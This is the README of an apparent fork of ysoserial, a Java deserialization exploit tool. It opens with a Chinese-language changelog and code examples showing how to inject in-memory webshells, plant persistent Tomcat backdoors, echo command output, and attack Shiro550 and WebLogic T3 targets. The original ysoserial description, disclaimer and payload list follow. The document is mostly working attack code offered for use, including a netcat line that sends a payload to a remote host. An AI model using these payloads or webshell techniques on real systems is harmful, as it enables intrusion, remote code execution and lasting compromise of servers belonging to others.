# added features

2022.9.5 自实现 jdk7u21、jdk8u20

2022.8.27 攻击T3

2022.8.20 解决tomcat的header过大问题，Value 内存马

2022.8.19 tomcat 持久化后门 ，Listener内存马

2022.8.10 springmvc interceptor内存马

2022.8.9 springmvc controller内存马

2022.8.4 evil ldap server 用于 jndi 注入高版本绕过

2022.7.23 agent型内存马

2022.7.9 heassian序列化、反序列化

2022.6.26 Encoder，ReadWrite 工具类

2022.6.11 JavaCompiler 工具类，使用javac动态编译实现Eavl，CC12，emptySignedObject二次反序列化，Filter 型、Servlet 型内存马

2022.6.10 RomeTools，Apereo CAS 4.1 RCE，CC8，CC9，CC10

2022.4.22 RCE 回显，shiro550，RequestHttp工具类，CB no CC



## exploit

> 对增加的一些 features 的用法，做简单的展示

### jdk8u20 使用

```java
package top.inhann;

import ysoserial.payloads.Jdk8u20_my;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/bitch";
        byte[] ser = new Jdk8u20_my().getPayload("calc.exe");
        byte[] resp = new HttpRequest(url).addPostData(ser).send();
        System.out.println(new String(resp));
    }
}
```



### 注入内存马：

filter 内存马：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.memshell.FilterShell2;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/bitch";
        Object o = new FilterShell2().getObject(CommonsCollections10.class);
        byte[] ser = Serializer.serialize(o);
        byte[] resp = new HttpRequest(url).addPostData(ser).send();
        System.out.println(new String(resp));
    }
}
```

springboot interceptor 内存马：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.memshell.SpringInterceptorShell;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8080/bitch";
        Object o = new SpringInterceptorShell().getObject(CommonsCollections10.class);
        byte[] ser = Serializer.serialize(o);
        byte[] resp = new HttpRequest(url).addPostData(ser).send();
        System.out.println(new String(resp));
    }
}
```

### 攻击 T3：

```java
package top.inhann;

import ysoserial.payloads.T3;
import ysoserial.payloads.URLDNS;
import ysoserial.payloads.util.SocketClient;

public class Test {
    public static void main(String[] args) throws Exception{
        SocketClient s = SocketClient.remote("wsl.com",7001);

        Object evil = new URLDNS().getObject("http://6biqhbd2azsc3wq9wv5uqqrep5vwjl.burpcollaborator.net");
        byte[] handshake = new T3().handShake();
        byte[] payload = new T3().getPayload(evil);

        s.send(handshake);
        s.recvline();
        s.send(payload);
        s.close();
    }
}
```

### 解决 tomcat 的 header 过大问题

分离 payload ，body 存储，动态加载：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.headertoolarge.TomcatHeaderTooLarge;
import ysoserial.payloads.util.Encoder;
import ysoserial.payloads.util.HttpRequest;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

import java.util.Base64;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8081/bitch";

        String java = new String(ReadWrite.readResource(Test.class,"内存马/filter/FilterShell2.java"));
        byte[] b = JavaCompiler.compile("FilterShell2",java);
        String b64 = Encoder.base64_encode(b);

        Object o = new TomcatHeaderTooLarge().loadClassFromBody(CommonsCollections10.class,"FilterShell2");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).addPostData("b64_class_bytes",b64).send();
    }
}
```

分离 payload ，落地存储，动态加载：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.Eval;
import ysoserial.payloads.util.HttpRequest;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

import java.util.Arrays;
import java.util.Base64;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8081/bitch";
        String classPath = "/tmp/1nhann.txt";
        String className = "FilterShell2";

        String java = new String(ReadWrite.readResource(Test.class,"内存马/filter/FilterShell2.java"));
        byte[] b = JavaCompiler.compile("FilterShell2",java);


        System.out.println(b.length);
        int i = 0;
        boolean flag = true;
        int l = 1000;
        while (flag){
            byte[] slice = null;
            if(i+l < b.length){
                slice = Arrays.copyOfRange(b, i, i+l);
                i += l;
            }else {
                slice = Arrays.copyOfRange(b, i, b.length);
                flag = false;
            }
            Object o = new Eval().uploadFile(CommonsCollections10.class,slice,classPath,i > l);
            byte[] ser = Serializer.serialize(o);
            new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();
        }
        Object o = new Eval().loadClass(CommonsCollections10.class,classPath,className);
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();

        o = new Eval().deleteFile(CommonsCollections10.class,classPath);
        ser = Serializer.serialize(o);
        new HttpRequest(url).addHeader("data", Base64.getEncoder().encodeToString(ser)).send();
    }
}
```

### tomcat 持久化后门：

劫持 `ApplicationFilterChain` 的 `doFilter()` ：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.persist.ApplicationFilterChain_doFilter;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8081/bitch";
        Object o = new ApplicationFilterChain_doFilter().getObject(CommonsCollections10.class,"/usr/local/tomcat");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}
```

利用 `ServletContainerInitializer` ：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.persist.EvilInitializer;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://wsl.com:8081/bitch";
        Object o = new EvilInitializer().getObject(CommonsCollections10.class,"/usr/local/tomcat/webapps/ROOT");
        byte[] ser = Serializer.serialize(o);
        new HttpRequest(url).addPostData(ser).send();
    }
}
```



### RCE 回显：

linux 通杀回显：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.rceecho.LinuxEcho;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://127.0.0.1:8081/bitch";
        Object o = new LinuxEcho().getObject(CommonsCollections10.class);
        byte[] ser = Serializer.serialize(o);
        byte[] resp =  new HttpRequest(url).addPostData(ser).send();
        System.out.println(new String(resp));
    }
}

```

tomcat 回显：

```java
package top.inhann;

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections10;
import ysoserial.payloads.rceecho.TomcatEcho3;
import ysoserial.payloads.util.HttpRequest;

public class Test {

    public static void main(String[] args) throws Exception{
        String url = "http://wsl.com:8081/bitch";
        Object o = new TomcatEcho3().getObject(CommonsCollections10.class);
        byte[] ser = Serializer.serialize(o);
        byte[] resp =  new HttpRequest(url).addPostData(ser).addHeader("cmd","id").send();
        System.out.println(new String(resp));
    }
}

```



### shiro550

```java
import ysoserial.payloads.util.HttpRequest;
import ysoserial.payloads.CommonsBeanutils183;
import ysoserial.payloads.Shiro_550;
import ysoserial.payloads.rceecho.TomcatEcho3;

public class Shiro550Exp {
    public static void main(String[] args) throws Exception{
        String url = "http://localhost:8080/shiro550/";
        Object o = new TomcatEcho3().getObject(CommonsBeanutils183.class);
        String cookie = new Shiro_550().getPayload(o);
        byte[] resp = new HttpRequest(url).addHeader("Cookie","rememberMe=" + cookie).addParam("cmd","id").addHeader("cmd","id").send();
        System.out.println(new String(resp));
    }
}
```







# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
    https://badges.gitter.im/frohoff/ysoserial.svg)](
    https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

1. Download the latest jar from
   [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
   [![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

Note that GitHub-hosted releases were removed in compliance with the
[GitHub Community Guidelines](
    https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
